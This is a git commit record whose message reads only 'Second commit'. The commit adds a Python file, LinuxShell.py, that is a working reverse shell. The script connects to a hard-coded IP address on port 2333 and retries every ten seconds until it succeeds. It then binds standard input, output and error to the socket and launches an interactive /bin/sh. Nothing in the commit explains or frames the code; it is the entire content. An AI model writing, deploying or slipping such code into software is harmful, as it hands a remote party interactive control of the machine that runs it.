989f551f4cc9629e25f1222f1f1d3cbe15827580
xichawai <xichaiwai@wanruyigezhizhang.local>
2017-10-18 08:41:44 +0800

    Second commit

---
+++ LinuxShell.py
@@ -0,0 +1,20 @@
+from socket import *
+import subprocess
+import os, threading
+import time
+
+
+
+def func():
+    s=socket(AF_INET,SOCK_STREAM)
+    while 1>0:
+        try:
+            s.connect(('23.83.249.21',2333))
+            break
+        except:
+            time.sleep(10)
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p=subprocess.call(["/bin/sh","-i"]);
+func()
